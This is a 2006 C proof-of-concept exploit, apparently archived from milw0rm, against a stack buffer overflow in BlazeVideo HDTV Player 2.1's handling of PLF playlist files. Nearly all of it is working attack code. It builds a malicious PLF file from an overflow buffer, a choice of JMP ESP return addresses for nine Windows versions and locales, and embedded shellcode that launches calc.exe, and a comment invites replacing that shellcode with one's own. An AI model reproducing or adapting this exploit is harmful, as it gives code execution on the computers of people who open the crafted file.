<html><head><title>BlazeVideo HDTV Player <= 2.1 Malformed PLF Buffer Overflow PoC</title></head><pre>/*
========================================================================
0-day BlazeVideo HDTV Player &lt;= v2.1 Malformed PLF Buffer Overflow PoC
========================================================================
BlazeVideo HDTV v2.1 and prior fails to properly handle large file paths inside
PLF files, the result is a stack based buffer overflow that allows an
attacker to execute code in the context of the player.

This exploit should also work for BlazeDVD v5.0, but i havent gotten
around to testing it.

C:\ + [BUFFER x 257 bytes] + [JMP] + [16 Garbage bytes] + [SHELLCODE in ESP]


Happy Hunting and Happy Holidays to everyone


&lt;insert super awesome leet ascii art here&gt;

30 days of Media Player Exploits by Greg Linares

Discovered and Reported By: Greg Linares GLinares.code@gmail.com
Reported Exploit Date: 12/1/2006

*/




#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
int main(int argc, char *argv[])
{

       FILE *Exploit;


       /* Executes Calc.exe Alpha2 Shellcode Provided by Expanders &lt;expanders[at]gmail[dot]com&gt; */
       unsigned char scode[] =
       &quot;TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI&quot;
       &quot;YlHhQTs0s0c0LKcuwLLK1ls52Xs1JONkRofxNkcoUpUQZKCylK4tLKuQxnTqo0LYnLMTkpptUWiQ9ZdM&quot;
       &quot;5QO2JKZT5k2tUtUTPuKULKQOfDc1zKPfNkflrkNkSowlvaZKLK5LlKgqxkMYqL14wtYSFQkpcTNkQPtp&quot;
       &quot;LEiPd8VlNkqPVllKPp7lNMLK0htHjKuYnkMPnP7pc05PLKsXUlsovQxvU0PVOy9hlCo0SKRpsXhoxNip&quot;
       &quot;sPu8LX9nMZvnv79oM7sSU1rLsSdnu5rX3UuPA&quot;;


       /* replace it with your own shellcode :) */


       int JMP, x;

       printf(&quot;\n======================================================================\n&quot;);
       printf(&quot;BlazeVideo HDTV Player &lt;= v2.3 M3U Buffer Overflow Exploit\n&quot;);
       printf(&quot;Discovered and Coded By: Greg Linares &lt;GLinares.code[at]gmail[dot]com&gt;\n&quot;);
       printf(&quot;Usage: %s &lt;output PLF file&gt; &lt;JMP&gt;\n&quot;, argv[0]);
       printf(&quot;\n JMP Options\n&quot;);
       printf(&quot;1 = English Windows XP SP 2 User32.dll &lt;JMP ESP 0x77db41bc&gt;\n&quot;);
       printf(&quot;2 = English Windows XP SP 1 User32.dll &lt;JMP ESP 0x77d718fc&gt;\n&quot;);
       printf(&quot;3 = English Windows 2003 SP0 and SP1 User32.dll &lt;JMP ESP 0x77d74adc&gt;\n&quot;);
       printf(&quot;4 = English Windows 2000 SP 4 User32.dll  &lt;JMP ESP 0x77e3c256&gt;\n&quot;);
       printf(&quot;5 = French Windows XP Pro SP2  &lt;JMP ESP 0x77d8519f&gt; \n&quot;);
       printf(&quot;6 = German/Italian/Dutch/Polish Windows XP SP2  &lt;JMP ESP 0x77d873a0&gt; \n&quot;);
       printf(&quot;7 = Spainish Windows XP Pro SP2 &lt;JMP ESP 0x77d9932f&gt; \n&quot;);
       printf(&quot;8 = French/Italian/German/Polish/Dutch Windows 2000 Pro SP4 &lt;JMP ESP 0x77e04c29&gt;\n&quot;);
       printf(&quot;9 = French/Italian/Chineese Windows 2000 Server SP4 &lt;JMP ESP 0x77df4c29&gt;\n&quot;);
       printf(&quot;====================================================================\n\n\n&quot;);


       /* thanks metasploit and jerome for opcodes */

       if (argc &lt; 2) {
               printf(&quot;Invalid Number Of Arguments\n&quot;);
               return 1;
       }


       Exploit = fopen(argv[1],&quot;w&quot;);
   if ( !Exploit )
   {
       printf(&quot;\nCouldn't Open File!&quot;);
       return 1;
   }



       fputs(&quot;C:\\&quot;, Exploit);

       for (x=0;x&lt;257;x++) {
               fputs(&quot;A&quot;, Exploit);
       }


       if (atoi(argv[2]) &lt;= 0) {
               JMP = 1;
       } else if (atoi(argv[2]) &gt; 4) {
               JMP = 1;
       } else {
               JMP = atoi(argv[2]);
       }
       switch(JMP) {
               case 1:
                       printf(&quot;Using English Windows XP SP2 JMP...\n&quot;);
                       fputs(&quot;\xbc\x41\xdb\x77&quot;, Exploit);
                       break;
               case 2:
                       printf(&quot;Using English Windows XP SP1 JMP...\n&quot;);
                       fputs(&quot;\xfc\x18\xd7\x77&quot;, Exploit);
                       break;
               case 3:
                       printf(&quot;Using English Windows 2003 SP0 &amp; SP1 JMP...\n&quot;);
                       fputs(&quot;\xdc\x4a\xd7\x77&quot;, Exploit);
                       break;
               case 4:
                       printf(&quot;Using English Windows 2000 SP 4 JMP...\n&quot;);
                       fputs(&quot;\x56\xc2\xe3\x77&quot;, Exploit);
                       break;
               case 5:
                       printf(&quot;Using French Windows XP SP 2 JMP...\n&quot;);
                       fputs(&quot;\x9f\x51\xd8\x77&quot;, Exploit);
                       break;
               case 6:
                       printf(&quot;Using German/Italian/Dutch/Polish Windows XP SP 2 JMP...\n&quot;);
                       fputs(&quot;\xa0\x73\xd8\x77&quot;, Exploit);
                       break;
               case 7:
                       printf(&quot;Using Spainish Windows XP SP 2 JMP...\n&quot;);
                       fputs(&quot;\x2f\x93\xd9\x77&quot;, Exploit);
                       break;
               case 8:
                       printf(&quot;Using French/Italian/German/Polish/Dutch Windows 2000 Pro SP 4 JMP...\n&quot;);
                       fputs(&quot;\x29\x4c\xe0\x77&quot;, Exploit);
                       break;
               case 9:
                       printf(&quot;Using French/Italian/Chineese Windows 2000 Server SP 4 JMP...\n&quot;);
                       fputs(&quot;\x29\x4c\xdf\x77&quot;, Exploit);
                       break;

       }

       for (x=0;x&lt;16;x++) {
               fputs(&quot;\x58&quot;, Exploit);
       }
       fputs(scode, Exploit);
       fputs(&quot;\r\n&quot;, Exploit);


       printf(&quot;Exploit Succeeded...\n Output File: %s\n\n&quot;, argv[1]);


       printf(&quot;Exploit Coded by Greg Linares (GLinares.code[at]gmail[dot]com)\n&quot;);
       printf(&quot;Greetz to: Everyone at EEye, Metasploit Crew, Jerome Athias and Expanders - Thanks For The Ideas, Tools and Alpha2 Shell Code\n&quot;);
       fclose(Exploit);
       return 0;
}

// milw0rm.com [2006-12-01]</pre></html>